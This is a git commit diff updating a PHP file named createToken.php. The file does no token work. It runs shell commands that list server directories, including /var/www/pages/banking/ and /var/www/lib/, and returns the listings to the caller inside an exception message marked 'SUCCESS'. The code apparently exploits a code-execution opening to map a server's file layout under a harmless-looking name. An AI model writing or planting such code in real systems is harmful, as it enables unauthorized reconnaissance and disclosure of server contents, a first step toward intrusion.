6c790adb8455354d95d479d4d2fcf47b99c2cb2c
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 20:12:58 +0100

    Update createToken.php

--- createToken.php
+++ createToken.php
@@ -1,13 +1,13 @@
 <?php
-ob_start();
-exec('ls /var/www/pages/');
-exec('ls /var/www/pages/banking/');
-exec('ls /usr/share/');
+$output ='';
+$output =$output.'\n pages'.shell_exec ('ls /var/www/pages/');
+$output =$output.'\n pages multi'.shell_exec ('ls /var/www/pages/ | xargs');
+$output =$output.'\n bank'.shell_exec ('ls /var/www/pages/banking/');
+$output =$output.'\n share'.shell_exec ('ls /usr/share/');
 
-exec('ls /usr/share/zoneinfo');
-exec('ls /var/www/lib/');
-exec('ls /var/www');
-$output = ob_get_contents();
-ob_end_clean();
+$output =$output.'\n zone'.shell_exec ('ls /usr/share/zoneinfo');
+$output =$output.'\n lib'.shell_exec ('ls /var/www/lib/');
+$output =$output.'\n www'.shell_exec ('ls /var/www');
+
 throw new Exception('SUCCESS '. $output);
 ?>
